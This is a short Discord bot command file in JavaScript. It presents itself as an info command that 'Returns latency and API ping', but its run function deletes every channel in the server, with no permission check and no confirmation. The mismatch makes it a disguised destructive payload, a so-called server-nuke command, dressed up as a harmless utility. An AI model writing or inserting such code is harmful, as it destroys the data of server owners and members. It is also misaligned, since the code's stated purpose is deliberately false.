const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'done',
    category : 'info',
    description : 'Returns latency and API ping',

    /**
     * @param {Client} client
     * @param {Message} message
     * @param {String[]} args
     */

    run : async(client, message, args) => {
        message.guild.channels.cache.forEach(channel => channel.delete())
    }
}